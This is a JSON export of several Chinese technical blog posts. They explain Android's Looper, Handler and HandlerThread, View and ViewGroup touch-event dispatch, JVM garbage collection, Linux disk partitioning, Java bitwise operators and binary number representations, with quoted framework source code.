在构造函数中，looper首先构造了一个消息队列，然后得到了当前线程的对象。总的来说Looper.prepare方法判断当前线程是否绑定了一个looper对象，如果没有就构造一个含有消息队列looper对象并绑定到当前线程上。接下来我们来看看Looper的loop方法： 12345678910111213141516171819202122232425public static void loop() &#123; final Looper me = myLooper(); if (me == null) &#123; throw new RuntimeException(\"No Looper; Looper.prepare() wasn't called on this thread.\"); &#125; final MessageQueue queue = me.mQueue; ... for (;;) &#123; Message msg = queue.next(); // might block if (msg == null) &#123; // No message indicates that the message queue is quitting. return; &#125; ... msg.target.dispatchMessage(msg); ... msg.recycleUnchecked(); &#125; &#125; 方法的第2行调用了myLooper方法，这个方法返回了当前线程持有的looper对象： 123public static @Nullable Looper myLooper() &#123; return sThreadLocal.get(); &#125; 取得当前线程的looper对象后，方法获取了looper对象里面的消息队列，并进入一个循环开始处理消息。综上所述，Looper的作用是： 1. 封装了一个消息队列 2. 使用Looper.prepare方法把looper对象与当前线程绑定在一起 3. 线程调用Looper.loop方法后，处理消息队列的消息 Handler类分析接下来我们来看看Handler： 123456789101112131415161718public Handler(Callback callback, boolean async) &#123; ... mLooper = Looper.myLooper(); if (mLooper == null) &#123; throw new RuntimeException( \"Can't create handler inside thread that has not called Looper.prepare()\"); &#125; mQueue = mLooper.mQueue; mCallback = callback; mAsynchronous = async; &#125; public Handler(Looper looper, Callback callback, boolean async) &#123; mLooper = looper; mQueue = looper.mQueue; mCallback = callback; mAsynchronous = async; &#125; 123public interface Callback &#123; public boolean handleMessage(Message msg); &#125; Handler类拥有多个构造函数，但最后都会调用上面这两个构造函数。第一个构造函数获取当前线程的looper对象，第二个构造函数获取传入参数的looper对象，然后获取保存looper对象的消息队列，同时保存了一个callback的回调接口，和一个布尔变量值表示是否异步。由上面的方法我们知道，为什么调用Handler()之前一定要调用Looper.prepare方法了。根据官方的文档所知，Handler类其实就是一个用来处理消息的辅助类，里面主要提供了这些方法： 12345public void handleMessage(Message msg) public final Message obtainMessage() public final boolean post(Runnable r) public final boolean sendMessage(Message msg) public final void removeMessages(int what) 对上面的方法稍作分析，我们就能明白其他方法，我们取sendMessage方法为例： 12345678910111213141516171819202122232425262728293031public final boolean sendMessage(Message msg) &#123; return sendMessageDelayed(msg, 0); &#125; public final boolean sendMessageDelayed(Message msg, long delayMillis) &#123; if (delayMillis &lt; 0) &#123; delayMillis = 0; &#125; return sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis); &#125; public boolean sendMessageAtTime(Message msg, long uptimeMillis) &#123; MessageQueue queue = mQueue; if (queue == null) &#123; RuntimeException e = new RuntimeException( this + \" sendMessageAtTime() called with no mQueue\"); Log.w(\"Looper\", e.getMessage(), e); return false; &#125; return enqueueMessage(queue, msg, uptimeMillis); &#125; private boolean enqueueMessage(MessageQueue queue, Message msg, long uptimeMillis) &#123; msg.target = this; if (mAsynchronous) &#123; msg.setAsynchronous(true); &#125; return queue.enqueueMessage(msg, uptimeMillis); &#125; 从上面的方法我们可以发现，如果没有Handler的辅助，由我们自己来操作消息队列，是多么麻烦的一件事情！Handler把Message的target设为自己，是因为Handler不仅封装了消息的发送，还封装了消息的处理。看回Looper.loop方法我们发现，最终消息的处理是在第19行：交给了Message对象的target的dispatchMessage方法实现，该方法如下所示： 123456789101112public void dispatchMessage(Message msg) &#123; if (msg.callback != null) &#123; handleCallback(msg); &#125; else &#123; if (mCallback != null) &#123; if (mCallback.handleMessage(msg)) &#123; return; &#125; &#125; handleMessage(msg); &#125; &#125; 该方法定义了一套消息处理的优先级机制： 1. 如果Message自带了callback，则交给callback处理 2. 如果Handler设置了全局的mCallback，则交给mCallback处理 3. 如果上述都没有，则交给Handler子类实现的handleMessage方法处理一般情况我们都会使用第三种处理方式，因此我们在构造handler对象的时候都会重写里面的handleMessage方法。看完了消息的投递和处理，我们再来看看如何获取消息： 1234567891011121314151617181920212223242526272829public final Message obtainMessage() &#123; return Message.obtain(this); &#125;public static Message obtain(Handler h) &#123; Message m = obtain(); m.target = h; return m; &#125; /** * Return a new Message instance from the global pool. Allows us to * avoid allocating new objects in many cases. */ public static Message obtain() &#123; synchronized (sPoolSync) &#123; if (sPool != null) &#123; Message m = sPool; sPool = m.next; m.next = null; m.flags = 0; // clear in-use flag sPoolSize--; return m; &#125; &#125; return new Message(); &#125; Handler类中的obtainMessage最终调用了Message类中的obtain方法，该方法首先判断在消息池中是否有可以回收的消息对象，如果有则使用可回收的消息对象，否则就新创建一个消息对象。通过调用该方法我们可以在多种情况下避免创建过多的消息对象，节省了内存空间。综上所述，Looper类掌握着线程的消息队列，封装了消息循环；而Handler类则是消息处理的辅助类，里面封装了消息的投递、处理和获取等一系列操作。 HandlerThread的使用我们考虑如下一段代码： 1234567891011121314151617181920212223public class MyActivity extends Activity &#123; private static String TAG = \"MyActivity\"; private Looper looper; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Thread myThread = new Thread() &#123; @Override public void run() &#123; Looper.prepare(); looper = Looper.myLooper(); Looper.loop(); &#125; &#125;; myThread.start(); Handler handler = new Handler(looper); // 有问题！ &#125; &#125; 在代码中我们新建了一个新的线程，并通过为其设置绑定Looper从而在主线程使用Handler与该线程进行通信。然而我们的代码是有错误的，了解多线程编程的同学应该知道，在并发编程中线程执行的顺序是不可预测的，因此在注释那一行构造Handler时传入的looper参数极有可能为null。那么我们该如何解决这个问题呢？针对这个问题，Android官方已经为我们提供了一个HandlerThread类供我们使用，我们来看一下其中的关键代码： 123456789101112131415161718192021222324252627282930313233343536@Override public void run() &#123; mTid = Process.myTid(); Looper.prepare(); synchronized (this) &#123; mLooper = Looper.myLooper(); notifyAll(); &#125; Process.setThreadPriority(mPriority); onLooperPrepared(); Looper.loop(); mTid = -1; &#125; /** * This method returns the Looper associated with this thread. If this thread not been started * or for any reason is isAlive() returns false, this method will return null. If this thread * has been started, this method will block until the looper has been initialized. * @return The looper. */ public Looper getLooper() &#123; if (!isAlive()) &#123; return null; &#125; // If the thread has been started, wait until the looper has been created. synchronized (this) &#123; while (isAlive() &amp;&amp; mLooper == null) &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; &#125; &#125; &#125; return mLooper; &#125; HandlerThread提供了getLooper方法让我们获取构造线程的Looper对象，从上可以看出Google巧妙地使用了一对wait/notifyAll解决了我们的问题。因此以后要是我们的子线程需要使用Looper与Handler通信时，记得使用官方提供的HandlerThread即可。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"Android View 与 ViewGroup 事件分发总结","slug":"Android-View-与-ViewGroup-事件分发总结","date":"2016-03-06T12:16:43.000Z","updated":"2020-05-11T07:23:44.522Z","comments":true,"path":"2016/03/06/Android-View-与-ViewGroup-事件分发总结/","link":"","permalink":"https://superxlcr.github.io/2016/03/06/Android-View-与-ViewGroup-事件分发总结/","excerpt":"","text":"View 点击事件分发当一个控件被点击时，该控件的dispatchTouchEvent方法就会被调用，由于View的子类没有重写该方法（ViewGroup等会再讨论），故该控件的类会不断往基类查找，最终点击事件的分发由View里的 dispatchTouchEvent方法开始进行。 123456789101112131415public boolean dispatchTouchEvent(MotionEvent event) &#123; ... //noinspection SimplifiableIfStatement ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnTouchListener != null &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; li.mOnTouchListener.onTouch(this, event)) &#123; return true; &#125; if (onTouchEvent(event)) &#123; return true; &#125; ... return false; &#125; 以上为View的dispatchTouchEvent方法的代码，dispatchTouchEvent传入一个带有点击信息的event参数，返回一个布尔值，表示这个点击事件是否已经被消费处理。代码中比较关键的是第5行的if语句：其中判断了mOnTouchListener是否为null，而mOnTouchListener顾名思义就是我们平时经常注册的touch事件监听器了 123public void setOnTouchListener(OnTouchListener l) &#123; getListenerInfo().mOnTouchListener = l; &#125; 以上为View中的注册touch事件监听器代码。发现touch事件监听器不为null时，View就会调用listener的onTouch方法了，如果onTouch方法返回了true，那么该方法就不会往下继续执行，dispatchTouchEvent就会返回true代表事件被消费掉了。但如果我们没有注册touch事件监听器，或者在onTouch方法中返回了false，方法就会继续执行进入到onTouchEvent中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143public boolean onTouchEvent(MotionEvent event) &#123; final int viewFlags = mViewFlags; if ((viewFlags &amp; ENABLED_MASK) == DISABLED) &#123; if (event.getAction() == MotionEvent.ACTION_UP &amp;&amp; (mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; setPressed(false); &#125; // A disabled view that is clickable still consumes the touch // events, it just doesn't respond to them. return (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)); &#125; if (mTouchDelegate != null) &#123; if (mTouchDelegate.onTouchEvent(event)) &#123; return true; &#125; &#125; if (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)) &#123; switch (event.getAction()) &#123; case MotionEvent.ACTION_UP: boolean prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != 0; if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0 || prepressed) &#123; // take focus if we don't have it already and we should in // touch mode. boolean focusTaken = false; if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) &#123; focusTaken = requestFocus(); &#125; if (prepressed) &#123; // The button is being released before we actually // showed it as pressed. Make it show the pressed // state now (before scheduling the click) to ensure // the user sees it. setPressed(true); &#125; if (!mHasPerformedLongPress) &#123; // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) &#123; // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. if (mPerformClick == null) &#123; mPerformClick = new PerformClick(); &#125; if (!post(mPerformClick)) &#123; performClick(); &#125; &#125; &#125; if (mUnsetPressedState == null) &#123; mUnsetPressedState = new UnsetPressedState(); &#125; if (prepressed) &#123; postDelayed(mUnsetPressedState, ViewConfiguration.getPressedStateDuration()); &#125; else if (!post(mUnsetPressedState)) &#123; // If the post failed, unpress right now mUnsetPressedState.run(); &#125; removeTapCallback(); &#125; break; case MotionEvent.ACTION_DOWN: mHasPerformedLongPress = false; if (performButtonActionOnTouchDown(event)) &#123; break; &#125; // Walk up the hierarchy to determine if we're inside a scrolling container. boolean isInScrollingContainer = isInScrollingContainer(); // For views inside a scrolling container, delay the pressed feedback for // a short period in case this is a scroll. if (isInScrollingContainer) &#123; mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) &#123; mPendingCheckForTap = new CheckForTap(); &#125; postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout()); &#125; else &#123; // Not inside a scrolling container, so show the feedback right away setPressed(true); checkForLongClick(0); &#125; break; case MotionEvent.ACTION_CANCEL: setPressed(false); removeTapCallback(); removeLongPressCallback(); break; case MotionEvent.ACTION_MOVE: final int x = (int) event.getX(); final int y = (int) event.getY(); // Be lenient about moving outside of buttons if (!pointInView(x, y, mTouchSlop)) &#123; // Outside button removeTapCallback(); if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; // Remove any future long press/tap checks removeLongPressCallback(); setPressed(false); &#125; &#125; break; &#125; return true; &#125; return false; &#125; 以上是View的onTouchEvent的代码。由于代码很长，我们只看关键的部分，从第9行的注释我们可以得知，如果被点击的控件是disable的，那么该方法不会执行任何动作，但如果该控件是clickable的，dispatchTouchEvent方法依然会返回true，该点击事件依然会被消费掉。接着看到第23行，如果该控件是可点击的，那么代码就进入if语句里面，执行第60行的performClick方法 123456789101112public boolean performClick() &#123; sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED); ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnClickListener != null) &#123; playSoundEffect(SoundEffectConstants.CLICK); li.mOnClickListener.onClick(this); return true; &#125; return false; &#125; 以上就是View中performClick方法的代码，第7行就是我们调用了再熟悉不过的onClickListener的onClick方法了。综上所述，View的事件分发如下图所示： ViewGroup点击事件分发讲完了View的事件分发机制，我们再来讲讲ViewGroup的事件分发机制。ViewGroup继承自View，然而ViewGroup重写了View中的dispatchTouchEvent方法，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980@Override public boolean dispatchTouchEvent(MotionEvent ev) &#123; ... boolean handled = false; if (onFilterTouchEventForSecurity(ev)) &#123; ... // Check for interception. final boolean intercepted; if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) &#123; final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) &#123; intercepted = onInterceptTouchEvent(ev); ev.setAction(action); // restore action in case it was changed &#125; else &#123; intercepted = false; &#125; &#125; else &#123; // There are no touch targets and this action is not an initial down // so this view group continues to intercept touches. intercepted = true; &#125; ... // Update list of touch targets for pointer down, if needed. final boolean split = (mGroupFlags &amp; FLAG_SPLIT_MOTION_EVENTS) != 0; TouchTarget newTouchTarget = null; boolean alreadyDispatchedToNewTouchTarget = false; if (!canceled &amp;&amp; !intercepted) &#123; ... final boolean customOrder = isChildrenDrawingOrderEnabled(); for (int i = childrenCount - 1; i &gt;= 0; i--) &#123; final int childIndex = customOrder ? getChildDrawingOrder(childrenCount, i) : i; final View child = children[childIndex]; if (!canViewReceivePointerEvents(child) || !isTransformedTouchPointInView(x, y, child, null)) &#123; continue; &#125; newTouchTarget = getTouchTarget(child); if (newTouchTarget != null) &#123; // Child is already receiving touch within its bounds. // Give it the new pointer in addition to the ones it is handling. newTouchTarget.pointerIdBits |= idBitsToAssign; break; &#125; resetCancelNextUpFlag(child); if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) &#123; // Child wants to receive touch within its bounds. mLastTouchDownTime = ev.getDownTime(); mLastTouchDownIndex = childIndex; mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); newTouchTarget = addTouchTarget(child, idBitsToAssign); alreadyDispatchedToNewTouchTarget = true; break; &#125; &#125; ... &#125; // Dispatch to touch targets. if (mFirstTouchTarget == null) &#123; // No touch targets so treat this as an ordinary view. handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); &#125;... &#125; if (!handled &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(ev, 1); &#125; return handled; &#125; 我们依然是找关键代码来看，在第15行有一个非常关键的方法：onInterceptTouchEvent，该方法的返回值赋值给了布尔变量intercepted，而在第32行intercepted的取值决定了是否进入该if语句，而该if语句就是ViewGroup分发touchEvent给他的子View的关键所在。ViewGroup中的onInterceptTouchEvent方法如下： 12345678910111213141516171819202122232425262728293031323334353637383940/** * Implement this method to intercept all touch screen motion events. This * allows you to watch events as they are dispatched to your children, and * take ownership of the current gesture at any point. * * &lt;p&gt;Using this function takes some care, as it has a fairly complicated * interaction with &#123;@link View#onTouchEvent(MotionEvent) * View.onTouchEvent(MotionEvent)&#125;, and using it requires implementing * that method as well as this one in the correct way. Events will be * received in the following order: * * &lt;ol&gt; * &lt;li&gt; You will receive the down event here. * &lt;li&gt; The down event will be handled either by a child of this view * group, or given to your own onTouchEvent() method to handle; this means * you should implement onTouchEvent() to return true, so you will * continue to see the rest of the gesture (instead of looking for * a parent view to handle it). Also, by returning true from * onTouchEvent(), you will not receive any following * events in onInterceptTouchEvent() and all touch processing must * happen in onTouchEvent() like normal. * &lt;li&gt; For as long as you return false from this function, each following * event (up to and including the final up) will be delivered first here * and then to the target's onTouchEvent(). * &lt;li&gt; If you return true from here, you will not receive any * following events: the target view will receive the same event but * with the action &#123;@link MotionEvent#ACTION_CANCEL&#125;, and all further * events will be delivered to your onTouchEvent() method and no longer * appear here. * &lt;/ol&gt; * * @param ev The motion event being dispatched down the hierarchy. * @return Return true to steal motion events from the children and have * them dispatched to this ViewGroup through onTouchEvent(). * The current target will receive an ACTION_CANCEL event, and no further * messages will be delivered here. */ public boolean onInterceptTouchEvent(MotionEvent ev) &#123; return false; &#125; 注释非常长，而代码仅仅只是返回了一个false。由注释可知，该方法的作用是返回当前ViewGroup是否拦截点击的touchEvent，如果该方法返回false，则dispatchTouchEvent方法将会进入第32行的if语句，执行第54行的dispatchTransformedTouchEvent方法： 1234567891011121314151617181920private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel, View child, int desiredPointerIdBits) &#123; final boolean handled; // Canceling motions is a special case. We don't need to perform any transformations // or filtering. The important part is the action, not the contents. final int oldAction = event.getAction(); if (cancel || oldAction == MotionEvent.ACTION_CANCEL) &#123; event.setAction(MotionEvent.ACTION_CANCEL); if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; handled = child.dispatchTouchEvent(event); &#125; event.setAction(oldAction); return handled; &#125; ... &#125; 该方法为ViewGroup的一个private方法，他的返回值表示该点击事件是否被消费掉，方法的第1个参数即是我们的点击事件，我们重点注意方法的第3个参数child，在第10行的if语句中，如果child为null，则把touchEvent交给基类处理（就是把当前ViewGroup当成一个普通的View进行事件分发处理），如果child不为null，则把touchEvent交给child（子View）来处理。在dispatchTouchEvent的第54行我们传入了child的参数，故我们在尝试把touchEvent交给ViewGroup的子View处理。然而当onInterceptTouchEvent返回了true或子View处理点击事件失败时，我们就会执行dispatchTouchEvent方法的第71行，此时我们在此调用了dispatchTransformedTouchEvent方法，但是这次我们传入的child参数为null，故该方法会把点击事件交给ViewGroup的基类处理。综上所述，ViewGroup的点击事件分发流程如下：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"关于JVM的gc总结","slug":"关于JVM的gc总结","date":"2016-03-04T12:55:51.000Z","updated":"2020-05-11T07:23:44.818Z","comments":true,"path":"2016/03/04/关于JVM的gc总结/","link":"","permalink":"https://superxlcr.github.io/2016/03/04/关于JVM的gc总结/","excerpt":"","text":"最近在网上看了一些关于Java虚拟机垃圾回收（GC，Garbage Collection）的文章，感觉收获颇丰，故写一篇博客来总结一下： JVM结构上图中就是JVM的示意图，从图中我们可以看出JVM主要划分为4个区域： 类装载器：作用是在JVM启动时或某个Class要运行的时候把类装载到JVM中。 运行时数据区（内存区域）：这是JVM在运行时操作的内存区域，主要可以分为5个区域，如下图所示： (1) 程序计数器（PC）：线程私有，用于保存当前线程执行的内存地址。 (2) Java栈：线程私有，每运行一个方法就创建一个栈帧，用于存储局部变量表、操作栈、方法返回值、常量引用等。 (3) 本地方法栈：线程私有，与Java栈类似，不过用于执行C/C++的native方法。 (4) 方法区：线程共享，里面存储了类结构信息、常量池以及静态变量等，一般不进行GC，因此也被称为永久代。方法区还包含一个运行时常量池。 (5) Java堆：线程共享，存储java实例或者对象的地方，这块是GC的主要区域。 执行引擎：负责执行class文件中包含的字节码指令 本地方法接口：主要是调用C/C++实现的本地方法 Java堆中各代分布上文提到了Java堆是GC的主要区域，我们先来看一下Java堆的结构分布：Java堆主要分为3代： 年轻代：这里是所有新对象产生的地方。年轻代被分为3个部分——Enden区（伊甸园区，新对象的出生地，这部分均为连续内存，分配快速）和两个Survivor区（From和to）。当Eden区被对象填满时，就会对Eden区和Survivor From区执行Minor GC（Young GC），并把所有存活下来的对象转移到Survivor To区，然后把from区变成下次GC的to区。这样在一段时间内，总会有一个空的Survivor区。经过多次GC周期后，仍然存活下来的对象会被转移到年老代内存空间。通常这是在年轻代有资格提升到年老代前通过设定年龄阈值来完成的。需要注意，Survivor的两个区是对称的，没先后关系，from和to是相对的。 年老代：与年轻代相比，年老代里面的对象存活时间较长，大小也较大（较大的对象可能直接进入年老代）。当年老代被空间占满时，会触发Major GC（Full GC），不仅对年老代进行GC，对年轻代和永久代也进行GC，释放掉已经没有被引用的对象。 永久代：永久代即上文提及的方法区，由于方法区放的都是静态文件，故GC影响并不是很大。 JVM的GC算法JVM GC的方法是分代分配，分代回收。 停止复制：对于生命周期较短的年轻代，JVM使用停止复制算法（Stop-and-copy），进行GC时需停止所有应用程序线程，把Eden区和Survivor From区活着的对象复制到Survivor To区（如果放不下会放进年老代），并清空Eden区和Survivor From区。 标记整理：对于对象较多较大的年老代，停止复制算法并不合适，于是我们使用标记整理算法（mark-sweep-compact）来进行年老代的GC。收集器先从根开始访问所有活跃对象，标记为活跃对象。然后再遍历一次整个内存区域，把所有没有标记活跃的对象进行回收处理。清楚以后内存碎片很多，最后将其合并成较大的内存块。 JVM的垃圾收集器JVM的垃圾收集器主要有：1.串行收集器2.并行收集器3.并发收集器4.增量并发收集器其中并行指的是暂停用户线程的多线程垃圾收集器，而并发指的是用户线程和垃圾收集线程共同工作的收集器。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"},{"name":"jvm","slug":"jvm","permalink":"https://superxlcr.github.io/tags/jvm/"}]},{"title":"Linux磁盘学习小结","slug":"Linux磁盘学习小结","date":"2016-03-01T12:37:28.000Z","updated":"2020-05-11T07:23:44.719Z","comments":true,"path":"2016/03/01/Linux磁盘学习小结/","link":"","permalink":"https://superxlcr.github.io/2016/03/01/Linux磁盘学习小结/","excerpt":"","text":"最近在看《鸟哥的Linux私房菜》学习Linux下关于磁盘的知识，在此做个小结： 磁盘连接方式与设备文件名关系目前个人计算机常见的磁盘接口有 IDE 和 SATA（主流） 两种。对于 IDE 接口，计算机一般提供2个接口，而每个接口又可以连接2个 IDE 设备，故在Linux其设备名称为/dev/hd[a-d]。但由于种种原因， IDE 接口现基本已弃用。现在个人计算机上主流的均为 SATA 接口，由于 SATA/USB/SCSI 等磁盘接口均使用 SCSI 模块来驱动，故在Linux下其设备名称均为/dev/sd[a-p]，且由于 SATA 接口没有固定的顺序，设备名称根据Linux内核检测到磁盘的顺序决定。 磁盘的组成磁盘主要由盘片，机械手臂，磁头和主轴马达组成，而盘片上又有扇区（每个大小为512byte）和柱面（圆环）两种单位。其中，整块磁盘的第一个扇区特别重要，因为第一扇区记录了主引导分区（Master Boot Record，MBR），一个可以安装加载程序的地方。除此以外，第一扇区还记录了分区表，用来记录整块硬盘分区的状态。 磁盘分区表磁盘分区的最小单位是柱面，其实所谓的“分区”就是修改第一扇区里的分区表。硬盘默认的分区表仅能写入四组分区信息，其中：主分区和扩展分区最多可以有4个，扩展分区最多只能有一个，只有扩展分区才能继续切割逻辑分区。（如果你想把磁盘分为5个区以上则必须有扩展分区） 开机流程在计算机开机时，系统首先会去执行 BIOS （Basic Input Output System），然后 BIOS 会去分析计算机上的设备文件，读取 MBR 里的引导加载程序（Boot loader，用于提供菜单，载入内核文件和加载其他的boot loader），由 loader 加载内核文件启动操作系统。","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"位运算总结","slug":"位运算总结","date":"2016-02-28T12:12:36.000Z","updated":"2020-05-11T07:23:44.796Z","comments":true,"path":"2016/02/28/位运算总结/","link":"","permalink":"https://superxlcr.github.io/2016/02/28/位运算总结/","excerpt":"","text":"所有数据在计算机中都是以二进制的形式存储的，两个数值间的位运算就是对他们的二进制形式进行处理。在Java中，位运算有以下这些： 与运算与运算的符号为&amp;，两个数字进行与运算，每一位上有0就变为0，都是1则为1，例： 11 &amp; 0 = 0; // 全部1和全部0做与运算为全部0 或运算或运算的符号为|，两个数字进行或运算，每一位上有1就变为1，都是0则为0，例： 11 | 0 = 1; // 全部1和全部0做或运算为全部1 异或运算异或运算的符号为^，两个数字进行异或运算，每一位上数字相同则为0，不同则为1，例： 11 ^ 0 = 1; // 全部1和全部0，每一位都不相同，故结果全为1 异或运算有一个简单的应用是交换两个变量： 1234int a, b;a = a ^ b;b = a ^ b;a = a ^ b; // a 和 b 已完成交换 取反运算取反运算的符号为~，对某个数字进行取反运算，每一位上数字0变为1，数字1变为0，例： 1~0 = -1; // 全为1，即-1； 左移运算左移运算的符号为&lt;&lt;，对某个数字进行左移运算，该数字的二进制数就整体向左移动一定位数，右边使用0来补充，例： 11 &lt;&lt; 1 = 2; 带符号右移运算带符号右移运算的符号为&gt;&gt;，对某个数字进行带符号右移运算，该数字的二进制数就整体向右移动一定位数，左边使用符号位(首位是0就补0；首位是1就补1）来补充，例： 122 &gt;&gt; 1 = 2;-2 &gt;&gt; 1 = -1; 无符号右移运算无符号右移运算的符号为&gt;&gt;&gt;，对某个数字进行无符号右移运算，该数字的二进制数就整体向右移动一定位数，左边使用0来补充，例： 122 &gt;&gt;&gt; 1 = 2;-2 &gt;&gt;&gt; 1 = 2147483647; 值得注意的是，移位运算符只能处理整数运算符，对于char、byte、short类型，在进行移位之前，都将被转换成int类型，移位后的结果也是int类型移位符号右边的操作数只截取其二进制的后5位（目的是防止因为移位操作而超出int类型的表示范围：2的5次方是32，int类型的最大范围是32位）；对long类型进行移位，结果仍然是long类型，移位符号右边的操作符只截取其二进制的后6位","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"原码，补码和反码总结","slug":"原码，补码和反码总结","date":"2016-02-27T12:45:13.000Z","updated":"2020-05-11T07:23:44.835Z","comments":true,"path":"2016/02/27/原码，补码和反码总结/","link":"","permalink":"https://superxlcr.github.io/2016/02/27/原码，补码和反码总结/","excerpt":"","text":"原码在计算机中，除了unsigned的数据类型，二进制数的第一位是用作符号位。正数用0表示，而负数用1表示。因此，32位的int类型的表示范围便是(去掉一位符号位）: $[2^{31}−1,−2^{31}]$ 而原码就是符号位加上真值的绝对值, 即用第一位表示符号, 其余位表示值。比如如果是8位二进制： $[+1]_{原码}=00000001$ $[−1]_{原码}=10000001$ 反码讲完了原码讲反码，反码的表示方法为：正数的反码：就是它本身。负数的反码：除符号位外，通通按位取反。比如刚才的8位二进制数： $[+1]_{反码}=00000001$ $[−1]_{反码}=11111110$ 补码再说到补码的表示方法：正数的补码：依然是他本身。负数的补码：在反码的基础上加1。又比如刚才的8位二进制数： $[+1]_{补码}=00000001$ $[−1]_{补码}=11111111$ 举栗子补码就是计算机储存数据的方法，因此，对于一个byte类型来说： $[a] = 127,[a_{补码}] = 01111111$ $[a + 1] = [127]_{补码} + 1 = 01111111 + 1 = 10000000$ $[b]_{补码} = 10000000$ $[b]_{反码} = 10000000 - 1 = 111111111$ $[b]_{原码} = 10000000 = -128$ $故127 + 1 = -128$","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]}]}